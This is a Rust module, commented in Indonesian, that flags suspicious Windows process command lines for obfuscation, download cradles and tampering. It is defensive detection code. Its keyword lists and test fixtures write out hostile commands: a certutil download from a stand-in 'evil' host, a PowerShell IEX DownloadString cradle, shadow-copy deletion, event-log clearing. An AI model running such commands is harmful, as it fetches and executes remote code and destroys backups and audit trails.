//! Analisis command-line (roadmap 1.1): obfuscation, download cradle, dan
//! tampering/persistence. Pencocokan dilakukan pada command line lowercase.

use super::flags;

/// Mengembalikan flag `cmdline_*` yang terpicu oleh command line sebuah proses.
pub fn analyze(name_lc: &str, command_line: &str) -> Vec<&'static str> {
    let cmd = command_line.to_lowercase();
    let tokens: Vec<&str> = cmd.split_whitespace().collect();

    let mut out = Vec::new();
    if is_obfuscated(name_lc, &cmd, &tokens) {
        out.push(flags::CMDLINE_OBFUSCATION);
    }
    if is_download_cradle(&cmd, &tokens) {
        out.push(flags::CMDLINE_DOWNLOAD_CRADLE);
    }
    if is_tampering(&cmd, &tokens) {
        out.push(flags::CMDLINE_TAMPERING);
    }
    out
}

fn contains_any(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| haystack.contains(n))
}

fn contains_all(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().all(|n| haystack.contains(n))
}

fn is_powershell(name_lc: &str) -> bool {
    name_lc == "powershell.exe" || name_lc == "pwsh.exe"
}

fn is_obfuscated(name_lc: &str, cmd: &str, tokens: &[&str]) -> bool {
    if cmd.contains("frombase64string") {
        return true;
    }
    if !is_powershell(name_lc) {
        return false;
    }

    // PowerShell menerima singkatan parameter: -e, -ec, -enc, -EncodedCommand, ...
    let encoded = tokens.iter().any(|t| {
        let t = t.trim_matches('"');
        t.strip_prefix('-')
            .or_else(|| t.strip_prefix('/'))
            .is_some_and(|rest| !rest.is_empty() && "encodedcommand".starts_with(rest))
    });

    encoded
        || contains_any(
            cmd,
            &[
                "-windowstyle hidden",
                "-w hidden",
                "-ep bypass",
                "-exec bypass",
                "-executionpolicy bypass",
                "'+'",
                "\"+\"",
            ],
        )
        // Backtick escaping berlebihan, mis. `i`e`x
        || cmd.matches('`').count() >= 3
}

fn is_download_cradle(cmd: &str, tokens: &[&str]) -> bool {
    if contains_any(
        cmd,
        &[
            "downloadstring",
            "downloadfile",
            "invoke-webrequest",
            "invoke-restmethod",
            "invoke-expression",
            "net.webclient",
            "start-bitstransfer",
            "-urlcache",
            "scrobj.dll",
            "|iex",
            "iex(",
        ],
    ) {
        return true;
    }
    if tokens.iter().any(|t| matches!(*t, "iex" | "iwr" | "irm")) {
        return true;
    }
    if cmd.contains("bitsadmin") && cmd.contains("/transfer") {
        return true;
    }
    if cmd.contains("mshta")
        && contains_any(cmd, &["http://", "https://", "vbscript:", "javascript:"])
    {
        return true;
    }
    cmd.contains("rundll32") && cmd.contains("javascript:")
}

fn is_tampering(cmd: &str, tokens: &[&str]) -> bool {
    (cmd.contains("vssadmin") && contains_all(cmd, &["delete", "shadows"]))
        || (cmd.contains("wmic") && contains_all(cmd, &["shadowcopy", "delete"]))
        || (cmd.contains("wbadmin") && contains_all(cmd, &["delete", "catalog"]))
        || (cmd.contains("bcdedit") && cmd.contains("/set"))
        || (cmd.contains("wevtutil") && tokens.iter().any(|t| matches!(*t, "cl" | "clear-log")))
        || contains_any(
            cmd,
            &["-disablerealtimemonitoring", "set-mppreference -disable"],
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_encoded_powershell() {
        let f = analyze("powershell.exe", "powershell.exe -NoP -enc ZQBjAGgAbwA=");
        assert!(f.contains(&flags::CMDLINE_OBFUSCATION));
    }

    #[test]
    fn detects_short_encoded_flag() {
        let f = analyze("pwsh.exe", "pwsh -e ZQBjAGgAbwA=");
        assert!(f.contains(&flags::CMDLINE_OBFUSCATION));
    }

    #[test]
    fn plain_powershell_is_clean() {
        let f = analyze("powershell.exe", "powershell.exe -Command Get-Date");
        assert!(f.is_empty());
    }

    #[test]
    fn encoding_word_is_not_a_false_positive() {
        let f = analyze(
            "powershell.exe",
            "powershell.exe -File a.ps1 -encoding utf8",
        );
        assert!(!f.contains(&flags::CMDLINE_OBFUSCATION));
    }

    #[test]
    fn detects_certutil_download() {
        let f = analyze(
            "certutil.exe",
            "certutil -urlcache -split -f http://evil/a.exe a.exe",
        );
        assert!(f.contains(&flags::CMDLINE_DOWNLOAD_CRADLE));
    }

    #[test]
    fn detects_iex_download_string() {
        let f = analyze(
            "powershell.exe",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')",
        );
        assert!(f.contains(&flags::CMDLINE_DOWNLOAD_CRADLE));
    }

    #[test]
    fn detects_shadow_copy_deletion() {
        let f = analyze("vssadmin.exe", "vssadmin delete shadows /all /quiet");
        assert!(f.contains(&flags::CMDLINE_TAMPERING));
    }

    #[test]
    fn detects_event_log_clearing() {
        let f = analyze("wevtutil.exe", "wevtutil cl security");
        assert!(f.contains(&flags::CMDLINE_TAMPERING));
    }
}
